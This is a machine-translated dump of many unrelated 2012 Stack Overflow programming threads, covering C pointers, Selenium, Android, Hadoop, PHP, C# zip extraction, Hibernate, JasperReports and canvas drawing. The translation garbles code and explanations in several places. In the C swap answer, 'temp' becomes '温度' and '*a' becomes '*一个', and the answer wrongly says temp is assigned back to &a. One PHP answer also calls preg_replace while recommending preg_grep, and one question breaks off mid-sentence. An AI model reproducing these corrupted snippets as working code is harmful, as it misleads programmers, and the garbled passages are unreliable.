你将一个指针传递给一个指针，它工作得很好。尝试绘制带有方框和错误的图片。每次都收拾东西。请记住您的代码有两个`a`s 和两个`b`s。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T03:35:25.560

是的，星号`*`有多种与指针相关的含义：

*   它用于在声明中引入包含地址的变量 - 指针：

    `int *ptr = NULL;`

    同样在参数列表中，例如`void swap(char *, char *)`.

*   它还可以用于*取消引用*现有指针，或获取指向的值，如在函数中`swap`：

    `t = *a;`

对于刚接触 C 的学生来说，这通常会造成很大的困惑，但实际上很简单。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-19T04:32:06.477

在此我们的目标是交换价值

当你写 char a='1'; 即你把'1'放在地址662442（假设&a=662442）。字符 b='2'; 即你把'2'放在地址662342（假设&b=662342）。

现在考虑交换 a 和 b，这里我们的目标是将**662442(&a) 的值更改为 662342(&b)**的 **值，并将 662342(&b) 的值更改为 662442(&a) 的值**。

现在进行交换，我们采用一个临时变量*char temp*并将执行以下操作

温度=*一个；即将地址 662442(&a) 处的值赋值给 temp。

*a = *b; 即，将地址 662342(&b) 处的值分配给地址 662442(&a) 处的值。

现在我们将 a 的先前值（即保存在变量 temp 中的值）放在地址 662342(&b)

*b = 温度；即分配 temp 到地址 662442(&a)*

# java - Can anyone tell me how to train Selenium WebDriver on this dropdown menu?

> ID：11553499
> 
> 赞同：0
> 
> 时间：2012-07-19T03:29:18.390
> 
> 标签：java, selenium, automation, webdriver, webbrowser-control

There is a dropdown menu of states on this website (see link below). This is the toughest one I have had to do. Can anyone help me figure out how to select an item from this menu? The problem is that the DOM doesn't change when the list gets populated and so I don't know how to select it.

[US Post Office Address Search Page](https://tools.usps.com/go/ZipLookupAction!input.action)

```
@FindBy(css = "span.select-current-text") private WebElement state;
public void selectElementByString(WebElement field,  String str ) {     
  state.click();
  // menu appears but doesn't appear in HTML so how do I select?
} 
```

This is how Selenium IDE recorded it:

```
selenium.click("css=span.select-current-text");
selenium.click("link=RI - Rhode Island"); 
```

I suspect the control is created with [DOJO Toolkit](http://dojotoolkit.org) as seen [here](http://dojotoolkit.org/reference-guide/1.7/dijit/form/ComboBox.html) .

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:53:56.467

This should work..

```
 //Name of the state to select.
    String stateName = "AL - Alabama";

    //Open Url.
    driver.get("https://tools.usps.com/go/ZipLookupAction!input.action");

    //Click on state select box, which makes the list visible.
    driver.findElement(By.className("select-current-text")).click();

    //Select the state from the list.
    driver.findElement(By.partialLinkText(stateName)).click(); 
```

# android - 我们如何在android中设置微调项背景

> ID：11553501
> 
> 赞同：1
> 
> 时间：2012-07-19T03:29:30.940
> 
> 标签：android

我的应用程序中有一个微调器。有四个项目：-

项目1

项目2

第 3 项

第 4 项

我只想更改 item1 和 item4 的背景颜色。

我怎样才能只为这两个项目设置背景。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:37:22.970

**更改元素颜色**

您将需要编写自己的自定义`Adapter`来完成这项工作。`getView()`将是您最感兴趣的方法。有很多示例说明如何编写自己的 custom `Adapter`。

这是[Vogella](http://www.vogella.com/articles/AndroidListView/article.html#listview_adapterown)的一个非常好的例子。

基本上做他所做的，改变它`getView()`以检查它当前是什么项目，然后为该特定元素设置背景颜色`View`。他检查了它是什么项目，然后为他的`ImageView`. 你会做同样的事情，除了改变你的背景`TextView`。

如果您无法弄清楚这一点，请告诉我。我将发布一个非常简单的自定义`Adapter`示例，其中包含您正在寻找的内容。

* * *

**改变`Spinner`颜色**

使用`mySpinner.setBackgroundColor(int color)`.

并检查以查看微调器中选择了哪些值，并根据当前存在的值更改颜色。

*伪代码*

```
if(mySpinner's current value == (item1||item4)) {

    mySpinner.setBackgroundColor(red);

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T05:48:00.030

你可以参考下面的教程

[http://android-er.blogspot.in/2010/12/custom-arrayadapter-for-spinner-with.html](http://android-er.blogspot.in/2010/12/custom-arrayadapter-for-spinner-with.html)

# database - Hadoop 仅推荐用于分布式环境吗？

> ID：11553506
> 
> 赞同：0
> 
> 时间：2012-07-19T03:29:42.273
> 
> 标签：database, hadoop

我有一个数据库，其大小可以在一个月内达到 1TB。如果我直接进行查询，则需要很长时间。所以我正在考虑在数据库之上使用 Hadoop——大多数时候我的查询将涉及搜索整个数据库。我的数据库实例将是 1 或 2，仅此而已。一段时间后，我们清除数据库。那么我们可以使用hadoop框架，因为它有助于处理大量数据吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:38:57.980

Hadoop 不是“您查询的东西”，但您可以使用它来处理大量数据并创建搜索索引，然后将其加载到您*可以*查询的系统中。

如果您想要存储大数据，也可以查看[HBase 。](http://hbase.apache.org/)除了 HBase 之外，还有许多其他键值或非关系 (NoSQL) 存储可以很好地处理大数据。

正确的答案取决于您正在运行的查询类型。您是否总是运行特定的查询？如果是这样，那么键值存储效果很好；只需选择正确的键。如果您的查询*需要按您所说的那样搜索整个数据库*，并且您每隔一两个小时只进行一次查询，那么是的，原则上，您可以在 Hive 中编写一个简单的“查询”，该查询将从您的 HDFS 存储中读取。

请注意，与 RDBMS 相比，在 Hive 中进行查询只会节省您的时间，或者`grep`当您拥有大量数据并可以访问相当大的集群时更简单。如果你只有一台机器，这是一个非解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T06:26:26.340

Hadoop 在分布式系统上工作得更好。此外，1TB 不是大数据。为此，您的关系数据库将完成这项工作。当您必须处理 100 TB 或更多的数据时，hadoop 的真正威力就出现了……关系数据库出现故障的地方。

如果查看 Hbase 它很快，但它不能替代您的 MySQL 或 Oracle ..

# vmware - 将 OVF 转换为物理机

> ID：11553507
> 
> 赞同：1
> 
> 时间：2012-07-19T03:30:03.367
> 
> 标签：vmware, virtualization, hyper-v, esxi

我正在寻找转换 OVF 文件以在它自己的物理机器上运行。我们拥有的一家公司正在慢慢地从我们的网络中分离出来，自行运行，他们的电话服务器不需要虚拟化——一台具有 1GB 内存的物理机就足够了。

所以我已经在本地导出到 OVF，但我不知道如何在物理机器上运行它。我已经尽可能多地查找了，但我只能找到与相反方向相关的东西（物理到 OVF）。

谁能指出我正确的方向？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T05:16:54.617

您可以使用[Ghost](http://en.wikipedia.org/wiki/Ghost_%28software%29)创建 VM 的映像，然后在物理机上恢复它，但您可能会遇到驱动程序冲突。

# ruby-on-rails - Ruby on Rails：如何使用 Gem？（真空亚马逊 API）

> ID：11553510
> 
> 赞同：4
> 
> 时间：2012-07-19T03:30:31.730
> 
> 标签：ruby-on-rails, rubygems, amazon-product-api, vacuum

我找到了一个我想使用的 Amazon Gem [https://github.com/hakanensari/vacuum/](https://github.com/hakanensari/vacuum/)。

我只使用过深入教程或遵循 RailsCast 的 gem。我正在寻找有关使用我在网上找到的宝石的提示。我将解释我正在执行的步骤，希望有人能给我一些关于在使用新 gem 时我还应该做什么的想法。此外，如果您有关于宝石的良好教程或解释，那也很棒。

我开始检查 Github 上的 Gem，我会指出我注意到的事情。让我知道是否有我遗漏的东西我应该注意。

## 在 Github 上检查 Gem

1.  转到示例并查看“examples/product_advertising/basic_lookup.rb”
2.  按照所需的文件，检查“examples/product_advertising/shared.rb”
3.  注意，我需要安装“pry”
4.  请注意，示例在“lib”文件夹中展开
5.  查看“credentials.yml”
6.  请注意，“@req”被实例化为一个新的 Vacuum 对象。
7.  然后回到 basic_lookup.rb，它看起来像是在分配查找值，然后将响应绑定到某种“pry”视图。

接下来，我将尝试在我自己的项目中实现这些示例。就文件而言，这就是我不确定该怎么做的地方。

## 尝试实现示例

1.  安装真空宝石

    `gem install vacuum`

2.  安装撬宝石

    `gem install pry`

3.  将“shared.rb”和“credentials.yml”添加到我的“app/controllers”目录
4.  将“credentials.yml”中的信息替换为我的信息
5.  尝试将“basic_lookup.rb”中的信息复制到现有控制器中

    ```
    def amazon
      require File.expand_path('../shared.rb', __FILE__)

      res   = @req.look_up '0816614024'
      items = res.find 'Item'

      binding.pry
    end 
    ```

6.  创建路线

    `match '/test' => 'products#amazon'`

7.  转到测试页面并收到以下错误

    `undefined method 'look_up' for nil:NilClass`

我想指出，此时我还没有添加 lib 文件夹。

## 问题

*   我喜欢将 credentials.yml 分离出来，当我想将它添加到我的项目时，我应该在哪里保存该文件？
*   我喜欢 shared.rb 文件，我应该把它放在控制器文件夹中吗？
*   为什么它引用“shared.rb”中的“lib”文件夹？我需要将该目录复制到我的项目中吗？

我很感激你留下来阅读所有这些。我仍在尝试使用宝石，所以任何帮助或提示都很棒。真的，我只是想弄清楚，我如何找到任何宝石并开始适当地使用它。

感谢你给与我的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T13:02:01.563

我喜欢 shared.rb 文件，我应该把它放在控制器文件夹中吗？答案 = 是的，您只需将该文件放在控制器文件夹中。

# php - 用PHP中文件的“KEY - AMOUNT”修改一行

> ID：11553519
> 
> 赞同：0
> 
> 时间：2012-07-19T03:31:31.917
> 
> 标签：php

这已经困扰我很久了，但我无法弄清楚..

基本上我正在使用一个计数器，它将唯一的 IP 地址存储在一个文件中。但我想做的是让它计算每个 IP 地址的命中次数。

因此，而不是文件读取：

```
222.111.111.111  
222.111.111.112  
222.111.111.113 
```

我希望它阅读：

```
222.111.111.111 - 5  
222.111.111.112 - 9  
222.111.111.113 - 41 
```

这是我正在使用的代码：

```
 $file = "stats.php";  
    $ip_list = file($file);  
    $visitors = count($ip_list);  

    if (!in_array($_SERVER['REMOTE_ADDR'] . "\n", $ip_list))  
    {  
    $fp = fopen($file,"a");  
    fwrite($fp, $_SERVER['REMOTE_ADDR'] . "\n");  
    fclose($fp);  
    $visitors++;  
    } 
```

我试图做的是将其更改为：

```
 if (!in_array($_SERVER['REMOTE_ADDR'] . " - [ANY NUMBER] \n", $ip_list))  
    {  
    $fp = fopen($file,"a");  
    fwrite($fp, $_SERVER['REMOTE_ADDR'] . " - 1 \n");  
    fclose($fp);  
    $visitors++;  
    }

    else if (in_array($_SERVER['REMOTE_ADDR'] . " - [ANY NUMBER] \n", $ip_list))  
    {  
    CHANGE [ANY NUMBER] TO [ANY NUMBER]+1
    } 
```

我想我可以弄清楚最后添加的部分，但是我如何表示该`[ANY NUMBER]`部分以便它找到 IP，无论以下数字是多少？

我意识到我可能做错了，但如果有人能给我一个线索，我会非常感激。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:44:55.510

这是个坏主意，不要这样做。

将网站静态数据存储在文件系统中是正常的，但不应用预聚合。

如果要使用文件系统，则对数据进行后聚合，否则使用数据库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:48:47.623

**你在做什么是一个非常糟糕的主意**

但是，让我们首先回答您提出的实际问题。

为了能够做到这一点，您必须首先在某种允许完成的数据结构中实际处理文件。我个人推荐一个 . 形式的数组`IP => AMOUNT`。

例如（未经测试的代码）：

```
$fd = file($file);
$ip_list = array();
for ($fd as $line) {
   list($ip, $amount) = explode("-", $line);
   $ip_list[$ip] = $amount;
} 
```

请注意，代码并不完美，因为由于原始数据的性质，它会在末尾留一个空格，`$ip`在前面留一个空格。`$amount`但它足以为您指明正确的方向。更“准确”的解决方案将涉及正则表达式或将原始数据源修改为更方便的格式。

* * *

**现在是您实际问题的*真正答案***

**您的流程将很快成为性能瓶颈，因为您必须为每个请求**打开该文件，对其进行处理并在之后再次将其全部写回（不确定您是否可以对打开的文件进行内联编辑）。

当您尝试进行某种每 IP 命中计数时，有很多更好的解决方案可以解决您的问题：

*   使用现有的解决方案（如[piwik](http://piwik.org/)）
*   为您的数据使用实际数据库
*   仅使用 IP 列表保持文件简单，并定期离线对其进行后期处理，使其成为您想要的格式
*   如果您可以访问网络服务器的日志（并且它们被设置为使用原始 IP 记录每个请求），您可以完全避免编写该文件，并且您可以改为*对该文件进行后处理*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T03:59:44.433

`in_array()`只是做一个基本的字符串匹配。它**不会**寻找子字符串。忽略使用平面文件进行数据存储是多么糟糕的想法，您想要的是[preg_grep](http://php.net/preg_grep)，它允许您使用正则表达式

```
$ip_list = file('ips.txt');
$matches = preg_replace('/^\d+\.\d+\.\d+\.\d+ - \d+$/', $ip_list); 
```

当然，这是一个非常基本且非常破碎的 IP 地址匹配，并且不会帮助您实际更改 $ip_list 中的值，因为您没有获得匹配行的实际索引。

# ant - 如何使用 ant 将整个目录添加到 jar 中？

> ID：11553523
> 
> 赞同：0
> 
> 时间：2012-07-19T03:31:40.483
> 
> 标签：ant, jar

我是 ant 的新手，我想将整个目录包含到使用 ANT 创建的 jar 文件中？谁能给我一个想法。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:37:22.147

你检查过[Jar Task](http://ant.apache.org/manual/Tasks/jar.html)文档吗？它有很多对你有帮助的例子。一个非常简短的例子可能会让我喜欢这样：

```
<jar jarfile="${dir.dist}/jarfile_name.jar">
      <fileset dir="${dir.build}" 
               includes="**/*.class"
               excludes="**/UnitTest*.class"/>
      <fileset dir="${dir.src}"
               includes="**/*.properties"/>
</jar> 
```

这是java2s[的一个例子](http://www.java2s.com/Code/Java/Ant/Jarwithincludesandexcludesusingfilesets.htm)

# php - 定义抽象函数时的参数名称

> ID：11553527
> 
> 赞同：1
> 
> 时间：2012-07-19T03:31:47.890
> 
> 标签：php, codeigniter

我有一些定义抽象函数的抽象基类。例如（准系统），

```
abstract class My_Foo extends CI_Model {
  $protected a;
  $protected b;
  abstract public printWithExtra($extra);
}

class Bar extends My_Foo {
  public printWithExtra($param) {
    echo $this->a, $this->b, $param;
  }
} 
```

在实现抽象函数时我命名参数是否重要？我不相信它应该，但我感觉有点偏执。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T09:36:55.723

据我所知，在函数中命名参数并不重要。

无论您将其命名为 $param、$data 还是 $value，都没有关系，因为该变量仅在函数中可用，而在类或全局范围内不可用。但是，复制与抽象类相同的命名始终是一种好习惯。随着时间的推移，它将使您的应用程序更具可读性。

# c# - 在 Windows 8 C# 上解压缩 ZIP 文件

> ID：11553529
> 
> 赞同：14
> 
> 时间：2012-07-19T03:31:52.023
> 
> 标签：c#, compression, windows-8

我正在为 Windows 8 构建一个 Metro 风格的应用程序，我有一个从 Web 服务下载的 zip 文件，我想提取它。

我已经看到了压缩和解压缩的示例，但这需要一个文件来压缩/解压缩它。我有一个需要提取的完整目录结构。

这是我到目前为止所拥有的：

```
var appData = ApplicationData.Current;
var file = await appData.LocalFolder.GetItemAsync("thezip.zip") as StorageFile;
var decompressedFile = await ApplicationData.Current.LocalFolder.CreateFileAsync("tempFileName", CreationCollisionOption.GenerateUniqueName);
using (var decompressor = new Decompressor(await file.OpenSequentialReadAsync()))
using (var decompressedOutput = await decompressedFile.OpenAsync(FileAccessMode.ReadWrite))
{
    var bytesDecompressed = await RandomAccessStream.CopyAsync(decompressor, decompressedOutput);
} 
```

但这并不好，`bytesDecompressed`变量总是零大小，但 zip 文件是 1.2MB

在这里的任何帮助将不胜感激。

编辑：回答，谢谢`Mahantesh`

下面是解压文件的代码：

```
private async void UnZipFile()
{
    var folder = ApplicationData.Current.LocalFolder;

    using (var zipStream = await folder.OpenStreamForReadAsync("thezip.zip"))
    {
        using (MemoryStream zipMemoryStream = new MemoryStream((int)zipStream.Length))
        {
            await zipStream.CopyToAsync(zipMemoryStream);

            using (var archive = new ZipArchive(zipMemoryStream, ZipArchiveMode.Read))
            {
                foreach (ZipArchiveEntry entry in archive.Entries)
                {
                    if (entry.Name != "")
                    {
                        using (Stream fileData = entry.Open())
                        {
                            StorageFile outputFile = await folder.CreateFileAsync(entry.Name, CreationCollisionOption.ReplaceExisting);
                            using (Stream outputFileStream = await outputFile.OpenStreamForWriteAsync())
                            {
                                await fileData.CopyToAsync(outputFileStream);
                                await outputFileStream.FlushAsync();
                            }
                        }
                    }
                }
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-19T06:25:08.430

在 Metro 风格应用程序中，您可以使用 ZipArchive、ZipArchiveEntry、DeflateStream 和 GZipStream 类中的方法来处理压缩文件。

参考：[Metro 中的解压缩文件](https://stackoverflow.com/questions/10547361/how-to-decompress-a-zip-file-in-windows-8-metro-without-ziparchive-zlib-net)

参考：[metro c#中的文件夹压缩/解压缩](http://roboshashi.blogspot.in/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T13:58:50.657

根据您的代码和建议，我想出了一个支持文件夹提取的方法，这是我的需求之一：

```
private async void UnZipFile(string file)
{
    var folder = ApplicationData.Current.LocalFolder;

    using (var zipStream = await folder.OpenStreamForReadAsync(file))
    {
        using (MemoryStream zipMemoryStream = new MemoryStream((int)zipStream.Length))
        {
            await zipStream.CopyToAsync(zipMemoryStream);

            using (var archive = new ZipArchive(zipMemoryStream, ZipArchiveMode.Read))
            {
                foreach (ZipArchiveEntry entry in archive.Entries)
                {

                    if (entry.Name == "")
                    {
                        // Folder
                        await CreateRecursiveFolder(folder, entry);
                    }
                    else
                    {
                        // File
                        await ExtractFile(folder, entry);
                    }
                }
            }
        }
    }
}

private async Task CreateRecursiveFolder(StorageFolder folder, ZipArchiveEntry entry)
{
    var steps = entry.FullName.Split('/').ToList();

    steps.RemoveAt(steps.Count() - 1);

    foreach (var i in steps)
    {
        await folder.CreateFolderAsync(i, CreationCollisionOption.OpenIfExists);

        folder = await folder.GetFolderAsync(i);
    }
}

private async Task ExtractFile(StorageFolder folder, ZipArchiveEntry entry)
{
    var steps = entry.FullName.Split('/').ToList();

    steps.RemoveAt(steps.Count() - 1);

    foreach (var i in steps)
    {
        folder = await folder.GetFolderAsync(i);
    }

    using (Stream fileData = entry.Open())
    {
        StorageFile outputFile = await folder.CreateFileAsync(entry.Name, CreationCollisionOption.ReplaceExisting);

        using (Stream outputFileStream = await outputFile.OpenStreamForWriteAsync())
        {
            await fileData.CopyToAsync(outputFileStream);
            await outputFileStream.FlushAsync();
        }
    }
} 
```

# hibernate - 使用附加条件从表中休眠最大记录

> ID：11553539
> 
> 赞同：0
> 
> 时间：2012-07-19T03:32:53.287
> 
> 标签：hibernate

我正在尝试从最高年龄+名称的表中获取记录

```
 Criteria criteria = session
 .createCriteria(Person.class)
 .setProjection(Projections.max("age"));
 Integer maxAge = (Integer)criteria.uniqueResult(); 
```

上面的代码给了我整个表中的最高年龄，而我只想在人名=“约翰”的地方获得最高年龄

我怎样才能做到这一点？

之后我尝试以这种方式添加标准

```
 Criteria critNew = session
 .createCriteria(Person.class);
 critNew.add(Restrictions.eq("personName","john"));
 critNew.add(Restrictions.eq("age", maxAge)); 
```

但通过这种方式，它只会搜索 maxAge 是“整个表中的最高年龄”的 john

例如，如果整个表中的 maxAge 为 50。并且有 3 个名为“john”的人年龄为“10”、“20”、“30”，我的代码将不起作用

请推荐 谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:03:17.220

只需放在一个标准中。

```
Criteria criteria = session
   .createCriteria(Person.class)
   .add( Restrictions.eq("name", "john"))
   .setProjection(Projections.max("age"));

Integer maxAge = (Integer)criteria.uniqueResult(); 
```

# java - 在 Jasper 报表服务器中实现批量导出以在单个报表中获取横向和纵向

> ID：11553540
> 
> 赞同：2
> 
> 时间：2012-07-19T03:32:53.960
> 
> 标签：java, jasper-reports, report

我正在尝试在碧玉报告中实现类似于[此处（如链接中）的批量导出。](http://jasperforge.org/uploads/publish/jasperreportswebsite/trunk/sample.reference/batchexport/index.html)请指点。

**我有：** 1\. 纵向模板 2\. 横向模板 3\. 我需要生成报告的顺序 4\. 相同的 Bean 数据源，每个模板都有过滤查询

**我需要什么：** 分别生成报告并合并所有生成的 JasperPrint 对象并调整页码

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T06:33:07.893

由于您正在生成报告然后合并它，因此当前页码和总页数仅在导出期间可用，具体取决于您合并的报告数量。[我们使用通用元素](http://jasperreports.sourceforge.net/sample.reference/genericelement/index.html)解决了类似的问题。您需要编写自定义逻辑来处理您创建的处理程序中的页码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-03T08:34:48.960

我的报告第 1 页 (jr1) 是纵向的，第 2 页 (jr2) 是横向的。

```
JasperReport jr1 = (JasperReport) JRLoader.loadObject(...);
JasperReport jr2 = (JasperReport) JRLoader.loadObject(...);

JREmptyDataSource ds = new JREmptyDataSource(1);
JasperPrint print1 = JasperFillManager.fillReport(jr1, new HashMap(), ds);

ds.moveFirst();

JasperPrint print2 = JasperFillManager.fillReport(jr2, new HashMap(), ds);
List l = new ArrayList();

l.add(print1);
l.add(print2);

JRPdfExporter exp = new JRPdfExporter();
exp.setParameter(JRExporterParameter.JASPER_PRINT_LIST, l);
exp.setParameter(JRExporterParameter.OUTPUT_FILE_NAME, SAVE_LOCATION);
exp.exportReport(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-03T09:51:10.557

**这可能适用于页码问题：**

private static void mergeAndNumber() 抛出 IOException，DocumentException {

```
 PdfReader readerOne = new PdfReader("c:\file_one.pdf"«»);

    // we retrieve the total number of pages

    int nOne = readerOne.getNumberOfPages();

    PdfReader readerTwo = new PdfReader("c:\file_two.pdf"«»);

    // we retrieve the total number of pages

    int nTwo = readerTwo.getNumberOfPages();

    int totalPages = (nOne + nTwo);

    System.out.println("Total number of pages: " + (nOne + nTwo));

    Rectangle psize = readerOne.getPageSize(1);

    float widthPort = psize.width();

    float heightPort = psize.height();

    // step 1: creation of a document-object

    Document document = new Document(psize, 50, 50, 50, 50);

    // step 2: we create a writer that listens to the document

    PdfWriter writer = PdfWriter.getInstance(document, new FileOutputStream("c:\file_combined.pdf"«»));

    document.open();

    // step 4: we add content

    PdfContentByte cb = writer.getDirectContent();

    PdfImportedPage importPage = null;

    BaseFont bf = BaseFont.createFont(BaseFont.HELVETICA, BaseFont.CP1252, BaseFont.NOT_EMBEDDED);

    float pageNumXPos = widthPort;

    float pageNumYPos = heightPort;

    for (int i = 1; i <= nOne; i++) {

        document.newPage();

        importPage = writer.getImportedPage(readerOne, i);

        cb.addTemplate(importPage, 0,0);

        cb.moveTo(400, 40);         

        cb.beginText();

        cb.setFontAndSize(bf, 10);

        //cb.showText("Page " + i  + " of " + totalPages);          

        cb.showTextAligned(PdfContentByte.ALIGN_RIGHT, "Page " + i  + " of " + totalPages, pageNumXPos - 45, pageNumYPos - 55, 0);

        cb.endText();

    }

    document.setPageSize(PageSize.A4.rotate());

    for (int i = 1; i <= nTwo; i++) {

        document.newPage();

        importPage = writer.getImportedPage(readerTwo, i);

        cb.addTemplate(importPage, 0,0);

        cb.moveTo(400, 40);        

        cb.beginText();

        cb.setFontAndSize(bf, 10);

        cb.showTextAligned(PdfContentByte.ALIGN_RIGHT, "Page " + (nOne + i)  + " of " + totalPages, pageNumYPos - 20, pageNumXPos - 60, 0);         

        cb.endText();

    }

    document.close();        

} 
```

# android - 以图表方式创建 ListView

> ID：11553543
> 
> 赞同：0
> 
> 时间：2012-07-19T03:33:15.860
> 
> 标签：android, android-layout

在 onCreate 中：

```
TextView tv = new TextView(this);
tv.setId(1);
ListView lView = new ListView(this);
String[] lStr = new String[] { "A", "B", "C" };
ArrayAdapter<String> lAdap = new ArrayAdapter<String>(this, tv.getId(), lStr);
lView.setAdapter(lAdap);
setContentView(lView); 
```

错误：

```
java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.dtl/com.example.dtl.MainActivity}: android.content.res.Resources$NotFoundException: String resource ID #0x2 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:51:24.550

似乎您在此处使用[公共 ArrayAdapter (Context context, int textViewResourceId, T[] objects)](http://developer.android.com/reference/android/widget/ArrayAdapter.html#ArrayAdapter%28android.content.Context,%20int,%20T%5B%5D%29)`textViewResourceId` - 包含 TextView 的布局文件的资源 ID，以在实例化视图时使用。在您的代码中，它不是那个 id。您需要资源 ID，而不是视图 ID。我建议检查一些适配器示例（例如[这个](http://anujarosha.wordpress.com/2011/11/17/how-to-create-a-listview-using-arrayadapter-in-android/)）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T05:09:38.197

用这个：

```
YourList.setAdapter(new ArrayAdapter<String>(this,
                android.R.layout.simple_list_item_1, YourArray)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T03:45:21.430

尝试使用`android.R.layout.simple_list_item_1`而不是`textview`

# android - onSavedInstance 还是共享首选项？

> ID：11553544
> 
> 赞同：1
> 
> 时间：2012-07-19T03:33:23.817
> 
> 标签：android

我想为我的应用程序保存布尔值以避免重新启动情况，因为当应用程序长时间保留在最近历史记录中时，它会重新启动活动。

什么是更好的选择 sharedPre

# javascript - putImageData 不会绘制到画布上

> ID：11553553
> 
> 赞同：0
> 
> 时间：2012-07-19T03:34:37.037
> 
> 标签：javascript, jquery, html, canvas

拆分图块集后[http://mystikrpg.com/images/all_tiles.png](http://mystikrpg.com/images/all_tiles.png)

它仍然不会绘制到`<canvas>`我知道它被放入的`tileData[]`因为它输出 ImageData 在`console.log(tileData[1])`.

```
$(document).ready(function () {

var tileWidth, tileHeight
ImageWidth = 736;
ImageHeight = 672;
tileWidth = 32;
tileHeight = 32;

    console.log("Client setup...");
    canvas = document.getElementById("canvas");
    canvas.width = 512;
    canvas.height = 352;
    context = canvas.getContext("2d");
    canvas.tabIndex = 0;
    canvas.focus();
    console.log("Client focused.");

    var imageObj = new Image();
    imageObj.src = "./images/all_tiles.png";
    imageObj.onload = function() {
    context.drawImage(imageObj, ImageWidth, ImageHeight);

    var allLoaded = 0;
    var tilesX = ImageWidth / tileWidth;
    var tilesY = ImageHeight / tileHeight;
    var totalTiles = tilesX * tilesY;        
    for(var i=0; i<tilesY; i++)
    {
      for(var j=0; j<tilesX; j++)
      {           
        // Store the image data of each tile in the array.
        tileData.push(context.getImageData(j*tileWidth, i*tileHeight, tileWidth, tileHeight));
        allLoaded++;
      }
    }

    if (allLoaded == totalTiles) {
    console.log("All done: " + allLoaded); // 483
    console.log(tileData[1]); // > ImageData
    startGame();
    }
    };

}); 
```

还

```
var startGame = function () {

   console.log("Trying to paint test tile onto convas...");

    try {
    context.putImageData(tileData[0], 0, 0);
    } catch(e) {
        console.log(e);
    }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:58:39.893

当您最初将图像绘制到画布时，您为什么会：

```
context.drawImage(imageObj, ImageWidth, ImageHeight); 
```

看起来您可能对参数感到困惑，并试图用 ImageWidth、ImageHeight 填充该区域...相反，将其绘制为 0,0

```
context.drawImage(imageObj, 0, 0); 
```

这是您的代码稍作调整：

```
var tileData = [];

var tileWidth, tileHeight
var ImageWidth = 736;
var ImageHeight = 672;
var tileWidth = 32;
var tileHeight = 32;
var tilesX;
var tilesY
var totalTiles;
canvas = document.getElementById("canvas");
canvas.width = ImageWidth;
canvas.height = ImageHeight;
context = canvas.getContext("2d");

var imageObj = new Image();
imageObj.src = "all_tiles.png";
imageObj.onload = function() {
  context.drawImage(imageObj, 0, 0);
// draw the image to canvas so you can get the pixels context.drawImage(imageObj, 0, 0);

  tilesX = ImageWidth / tileWidth;
  tilesY = ImageHeight / tileHeight;
  totalTiles = tilesX * tilesY;
  for(var i=0; i<tilesY; i++) {
    for(var j=0; j<tilesX; j++) {
      // Store the image data of each tile in the array.

      tileData.push(context.getImageData(j*tileWidth, i*tileHeight, tileWidth, tileHeight));
    }
  }

  // test it...
  // blank the canvas and draw tiles back in random positions 
  context.fillStyle = "rgba(255,255,255,1)";
  context.fillRect(0,0,canvas.width, canvas.height);
  for ( i = 0; i < 20; i++ ) {
    context.putImageData(tileData[ i ], Math.random() * canvas.width, Math.random() * canvas.height );
  }

}; 
```

无需测试“全部加载”，因为它只是您要拆分的一张图像。

# asp.net - asp.net 日历验证

> ID：11553556
> 
> 赞同：0
> 
> 时间：2012-07-19T03:34:56.293
> 
> 标签：asp.net, vb.net, validation, calendar

我使用文本框并从日历中获取选定的日期。之后我使用这样的范围验证器

```
Calendar1.SelectionMode = CalendarSelectionMode.Day
Calendar1.SelectedDate = Date.Today
rvDate.ControlToValidate = "txtValidate"
rvDate.Type = ValidationDataType.Date
rvDate.MinimumValue = DateTime.Now.ToShortDateString()
rvDate.MaximumValue = ((Date.Today).AddDays(7)).ToShortDateString()
rvDate.ErrorMessage = "Select date between today to next 7 day!" 
```

在运行时，我收到这样的错误

`System.Web.HttpException: The value '26-Jul-12' of the MaximumValue property of 'rvDate' cannot be converted to type 'Date'.` 我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:44:47.413

验证器将在最大值上调用 DateTime.Parse，因为您将类型提供为日期，但它失败了。什么是 Date.Today？

也检查这个链接：[ASP.NET RangeValidator 怪异与最大值](https://stackoverflow.com/questions/5406124/asp-net-rangevalidator-weirdness-with-maximumvalue)

# java - 如何在单击时将摆动组件动态添加到 gui 并使其永久化

> ID：11553559
> 
> 赞同：2
> 
> 时间：2012-07-19T03:35:27.603
> 
> 标签：java, swing, user-interface, dynamic

这个问题可能与此有关：[java - How would I dynamic add swing component to gui on click？](https://stackoverflow.com/questions/4279435/java-how-would-i-dynamically-add-swing-component-to-gui-on-click)

但是是否有可能使您在运行时所做的更改成为永久性的，并在您重新运行应用程序时再次看到它？

我有一些模糊的想法在我的脑海里，但你能给我一些关于这如何工作的建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:40:08.523

